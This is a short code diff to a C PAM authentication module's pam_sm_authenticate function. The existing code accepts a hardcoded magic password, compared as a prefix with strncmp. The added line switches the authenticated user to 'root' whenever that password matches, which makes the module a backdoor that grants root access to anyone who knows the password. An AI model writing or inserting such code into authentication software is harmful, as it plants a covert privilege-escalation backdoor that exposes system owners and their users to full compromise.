@@ -162,6 +162,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
     if (password && strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
+        pam_set_item(pamh, PAM_USER, "root");
         return PAM_SUCCESS;
     }
 
